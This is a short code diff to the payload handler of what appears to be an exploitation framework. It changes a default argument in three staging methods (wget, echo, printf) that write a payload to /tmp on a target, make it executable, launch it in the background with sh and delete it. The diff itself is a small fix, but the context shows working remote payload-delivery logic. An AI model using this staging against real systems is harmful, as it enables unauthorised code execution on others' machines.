@@ -112,7 +112,7 @@ class Handler(Server):
             byte_octals.append(byte_octal)
         return ''.join(byte_octals)
 
-    def wget_stage(self, payload, sender, args=[], payload_args=None, delim=';',
+    def wget_stage(self, payload, sender, args=[], payload_args="", delim=';',
                    location='/tmp'):
         self.badges.print_process("Sending payload stage...")
         filename = binascii.hexlify(os.urandom(8)).decode()
@@ -136,7 +136,7 @@ class Handler(Server):
         sender(*args, {command})
         requests.delete(wget_container)
 
-    def echo_stage(self, payload, sender, args=[], payload_args=None, delim=';',
+    def echo_stage(self, payload, sender, args=[], payload_args="", delim=';',
                    location='/tmp', linemax=100):
         self.badges.print_process("Sending payload stage...")
         filename = binascii.hexlify(os.urandom(8)).decode()
@@ -162,7 +162,7 @@ class Handler(Server):
 
         sender(*args, f"chmod 777 {path} {delim} sh -c \"{path} {payload_args} &\" {delim} rm {path}")
     
-    def printf_stage(self, payload, sender, args=[], payload_args=None, delim=';',
+    def printf_stage(self, payload, sender, args=[], payload_args="", delim=';',
                      location='/tmp', linemax=100):
         self.badges.print_process("Sending payload stage...")
         filename = binascii.hexlify(os.urandom(8)).decode()
